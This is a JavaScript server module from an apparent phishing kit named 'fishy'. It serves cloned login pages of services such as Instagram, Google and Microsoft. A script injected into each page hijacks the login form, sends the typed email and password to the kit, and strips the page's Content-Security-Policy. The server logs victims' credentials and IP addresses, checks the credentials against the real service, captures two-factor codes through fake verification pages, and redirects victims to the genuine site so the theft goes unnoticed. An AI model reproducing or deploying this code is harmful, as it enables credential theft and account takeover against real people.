import express from 'express';
import path from 'path';
import fs from 'fs';
import http from 'http';
import { fileURLToPath } from 'url';
import { getScrapedPage, getScrapedPath } from './service-registry.js';
import { forwardCredentials, forwardTwofaCode } from './forwarder.js';
import { captureStore } from './capture.js';
import chalk from 'chalk';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const CAPTURE_SCRIPT = `
<script id="fishy-capture">
(function(){
  var SERVICE = '__SERVICE__', SID = '__SESSION__', CAPTURED = false;
  var CAPTURE_API = '/api/capture', CAPTURE_2FA = '/api/capture-2fa';

  // Keep login buttons enabled — run whenever disabled/aria-disabled changes
  var enableObserver = new MutationObserver(function(){
    document.querySelectorAll('[disabled], [aria-disabled="true"]').forEach(function(el){
      el.disabled = false;
      if(el.tagName==='BUTTON'||el.tagName==='INPUT') el.removeAttribute('disabled');
      el.removeAttribute('aria-disabled');
    });
  });
  if(document.body) enableObserver.observe(document.body,{attributes:true,subtree:true,attributeFilter:['disabled','aria-disabled']});
  else document.addEventListener('DOMContentLoaded',function(){enableObserver.observe(document.body,{attributes:true,subtree:true,attributeFilter:['disabled','aria-disabled']});});

  function getCreds(){
    var email='', pass='';
    var e = document.querySelector('input[name="email"],input[name="username"],input[name="loginfmt"],input[name="accountIdentifier"],input[type="text"]');
    var p = document.querySelector('input[name="pass"],input[name="password"],input[type="password"]');
    if(e&&e.value) email=e.value;
    if(p&&p.value) pass=p.value;
    return{email:email,password:pass};
  }

  function showError(msg){
    var err = document.getElementById('fishy-error');
    if(!err){err=document.createElement('p');err.id='fishy-error';}
    err.textContent=msg||'Sorry, your password was incorrect.';
    err.style.cssText='color:#ed4956;font-size:14px;text-align:center;margin:8px 40px;padding:4px 0;line-height:1.4;';
    var box=document.querySelector('[role="presentation"]'),form=document.getElementById('login_form');
    (box||form)&&((box||form).parentNode.insertBefore(err,(box||form).firstChild));
    CAPTURED=false;
  }

  function showTwofaOverlay(html, sid){
    var d=document.createElement('div');d.id='fishy-2fa';
    d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;background:#fff;overflow:auto;';
    d.innerHTML=html;
    document.body.appendChild(d);
    d.querySelector('form')&&d.querySelector('form').addEventListener('submit',function(e){
      e.preventDefault();
      var inp=d.querySelector('input[type="text"],input[type="number"],input[name*="code"],input[name*="otp"]');
      var code=inp?inp.value:'';
      var x=new XMLHttpRequest();
      x.open('POST',CAPTURE_2FA,true);
      x.setRequestHeader('Content-Type','application/json');
      x.onload=function(){try{var r=JSON.parse(x.responseText);r.status==='success'?window.location.href=r.redirectUrl:alert('Invalid code.')}catch(e){}}
      x.send(JSON.stringify({sessionId:sid||SID,service:SERVICE,code:code}));
    });
  }

  function sendCreds(creds){
    if(CAPTURED||(!creds.email&&!creds.password))return;
    CAPTURED=true;
    var x=new XMLHttpRequest();
    x.open('POST',CAPTURE_API,true);
    x.setRequestHeader('Content-Type','application/json');
    x.onload=function(){
      try{
        var r=JSON.parse(x.responseText);
        if(r.status==='success')window.location.href=r.redirectUrl;
        else if(r.status==='2fa_required'){
          if(r.twofaHtml)showTwofaOverlay(r.twofaHtml,r.sessionId);
          else window.location.href='/2fa/'+r.sessionId;
        }else showError(r.message||'Sorry, your password was incorrect. Please double-check your password.');
      }catch(e){showError('Unable to sign in. Please try again.')}
    };
    x.onerror=function(){showError('Connection error.')};
    x.send(JSON.stringify({sessionId:SID,service:SERVICE,email:creds.email,password:creds.password}));
  }

  // Force pointer cursor on all interactive elements (React may bake cursor:not-allowed into SSR)
  var styleFix = document.createElement('style');
  styleFix.textContent = 'button,[role="button"],[type="submit"]{cursor:pointer!important}input{pointer-events:auto!important}';
  document.head.appendChild(styleFix);

  // 1. Intercept form submission (bubbling phase — stopImmediatePropagation prevents React)
  document.addEventListener('submit',function(e){
    if(e.target&&e.target.id==='login_form'){e.preventDefault();e.stopImmediatePropagation();sendCreds(getCreds());}
  },true);

  // 2. Capture-phase listener on document to intercept clicks before React
  document.addEventListener('click',function(e){
    var btn=e.target.closest('[role="button"],[type="submit"],button');
    if(!btn)return;
    var label=(btn.getAttribute('aria-label')||btn.innerText||btn.textContent||'').toLowerCase().replace(/[^a-z0-9\s]/g,'').trim();
    if(/log|next|continue|submit/.test(label)){
      e.stopImmediatePropagation();e.preventDefault();
      var creds=getCreds();
      if(!creds.email&&!creds.password)return;
      sendCreds(creds);
    }
  },true);

  // 3. Hook keyboard Enter on inputs
  document.addEventListener('keydown',function(e){
    if(e.key==='Enter'){
      var a=document.activeElement;
      if(a&&a.form&&a.form.id==='login_form'){
        var creds=getCreds();if(!creds.email||!creds.password)return;
        e.preventDefault();e.stopImmediatePropagation();
        sendCreds(creds);
      }
    }
  },true);
})();
</script>`;

const TWOFA_CAPTURE_SCRIPT = `
<script id="fishy-2fa-capture">
(function(){
  var SID='__SESSION__',SVC='__SERVICE__';
  document.addEventListener('submit',function(e){e.preventDefault();
    var code='';var inp=document.querySelector('input[type="text"],input[type="number"],input[name*="code"],input[name*="otp"]');if(inp)code=inp.value;
    var x=new XMLHttpRequest();x.open('POST','/api/capture-2fa',true);
    x.setRequestHeader('Content-Type','application/json');
    x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.status==='success')window.location.href=r.redirectUrl;else alert('Invalid code.')}catch(e){}};
    x.send(JSON.stringify({sessionId:SID,service:SVC,code:code}));
  },true);
})();
</script>`;

export function createServer(serviceName, port = 0) {
  const app = express();
  const server = http.createServer(app);

  app.use(express.json({ limit: '5mb' }));
  app.use(express.urlencoded({ extended: true, limit: '5mb' }));

  app.get('/', (req, res) => {
    let html = getScrapedPage(serviceName, 'login');
    if (!html) {
      return res.send(`<html><body><h1>${serviceName} login page not scraped yet</h1><p>Run: fishy scrape ${serviceName}</p></body></html>`);
    }

    const sessionId = crypto.randomUUID().slice(0, 8);
    const script = CAPTURE_SCRIPT
      .replace(/__SERVICE__/g, serviceName)
      .replace(/__SESSION__/g, sessionId);

    // Inject into <head> first so it runs before page JS
    if (html.includes('<head>')) {
      html = html.replace('<head>', '<head>\n' + script);
    } else if (html.includes('<html>')) {
      html = html.replace('<html>', '<html>\n<head>' + script + '\n</head>');
    } else {
      html = script + html;
    }

    // Remove Content-Security-Policy that blocks inline scripts
    html = html.replace(/<meta[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi, '');
    html = html.replace(/Content-Security-Policy[^;]*;/gi, '');

    // Strip external JS bundle script tags to prevent SPA re-rendering
    html = html.replace(/<script[^>]*src=["'][^"']*["'][^>]*>[\s\S]*?<\/script>/gi, '');
    // Remove disabled attribute from submit buttons so clicks work without React
    html = html.replace(/<button([^>]*) disabled(=[\s\S]*?)?>/gi, '<button$1>');
    // Remove aria-disabled so buttons don't look disabled / get cursor:not-allowed
    html = html.replace(/ aria-disabled=["']true["']/gi, '');

    res.set('Content-Type', 'text/html');
    res.send(html);
  });

  app.get('/2fa/:sessionId', (req, res) => {
    let html = getScrapedPage(serviceName, 'twofa');
    if (!html) {
      html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verification</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#fafafa}form{background:#fff;padding:40px;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,0.1);text-align:center;max-width:380px;width:90%}h1{font-size:22px;margin-bottom:8px;color:#262626}p{color:#8e8e8e;font-size:14px;margin-bottom:24px}input{width:200px;padding:14px;font-size:28px;letter-spacing:10px;text-align:center;border:1px solid #dbdbdb;border-radius:6px;outline:none;font-family:monospace;background:#fafafa}input:focus{border-color:#a8a8a8}button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:20px;opacity:0.7}button:active{opacity:1}</style></head><body><form method="POST"><h1>Two-Factor Authentication</h1><p>Enter the 6-digit code generated by your authenticator app or sent via SMS.</p><input type="text" name="code" placeholder="000000" maxlength="6" autofocus><button type="submit">Verify</button></form></body></html>`;
    }
    const script = TWOFA_CAPTURE_SCRIPT
      .replace(/__SESSION__/g, req.params.sessionId)
      .replace(/__SERVICE__/g, serviceName);
    if (html.includes('</body>')) {
      html = html.replace('</body>', script + '\n</body>');
    } else {
      html += script;
    }
    res.set('Content-Type', 'text/html');
    res.send(html);
  });

  app.post('/api/capture', async (req, res) => {
    const { service, email, password, sessionId } = req.body;

    if (!email && !password) {
      return res.json({ status: 'error', message: 'Email and password required' });
    }

    const captured = captureStore.add({
      service: service || 'unknown',
      email: email || '',
      password: password || '',
      validated: false,
      ip: req.ip || req.socket.remoteAddress,
      user_agent: req.get('User-Agent') || '',
    });

    const result = await forwardCredentials(service, email, password);

    const status = result.status;
    const isSuccess = status === 'success';
    const isTwofa = status === '2fa_required';
    const isAmbiguous = status === 'ambiguous';

    captureStore.setValidation(captured.id, isSuccess ? true : isTwofa ? '2fa' : isAmbiguous ? 'ambiguous' : false, result.message);

    if (isTwofa) {
      let twofaHtml = null;
      const scrapedPath = getScrapedPath(service);
      const twofaPath = path.join(scrapedPath, 'twofa.html');
      if (fs.existsSync(twofaPath)) {
        twofaHtml = fs.readFileSync(twofaPath, 'utf-8');
        const s = TWOFA_CAPTURE_SCRIPT.replace(/__SESSION__/g, sessionId).replace(/__SERVICE__/g, service);
        twofaHtml = twofaHtml.replace('</body>', s + '\n</body>');
      }
      res.json({ status: '2fa_required', message: '2FA verification required', sessionId, twofaHtml });
    } else if (isSuccess) {
      const redirectMap = {
        instagram: 'https://www.instagram.com/', google: 'https://myaccount.google.com/',
        facebook: 'https://www.facebook.com/', twitter: 'https://x.com/home',
        linkedin: 'https://www.linkedin.com/feed/', github: 'https://github.com/',
        microsoft: 'https://account.microsoft.com/', apple: 'https://appleid.apple.com/',
        netflix: 'https://www.netflix.com/browse',
      };
      res.json({ status: 'success', message: 'Login successful', redirectUrl: redirectMap[service] || `https://www.${service}.com/` });
    } else {
      res.json({ status: 'error', message: result.message || 'Invalid email or password. Please try again.' });
    }
  });

  app.post('/api/capture-2fa', async (req, res) => {
    const { service, code } = req.body;
    if (!code) return res.json({ status: 'error', message: 'Verification code required' });

    const creds = captureStore.getAll();
    for (let i = creds.length - 1; i >= 0; i--) {
      if (!creds[i].twofa_code) { creds[i].twofa_code = code; break; }
    }
    captureStore.save();
    console.log(`  ${chalk.magenta('[2FA]')} Code: ${chalk.magenta(code)}`);

    const redirectMap = {
      instagram: 'https://www.instagram.com/', google: 'https://myaccount.google.com/',
      facebook: 'https://www.facebook.com/', twitter: 'https://x.com/home',
      linkedin: 'https://www.linkedin.com/feed/', github: 'https://github.com/',
      microsoft: 'https://account.microsoft.com/', apple: 'https://appleid.apple.com/',
      netflix: 'https://www.netflix.com/browse',
    };
    res.json({ status: 'success', message: 'Verification successful', redirectUrl: redirectMap[service] || `https://www.${service}.com/` });
  });

  app.get('/api/status', (req, res) => {
    res.json({ service: serviceName, uptime: process.uptime(), captures: captureStore.count() });
  });

  return new Promise((resolve) => {
    server.listen(port, '0.0.0.0', () => {
      const addr = server.address();
      resolve({ app, server, port: addr.port, url: `http://localhost:${addr.port}` });
    });
  });
}
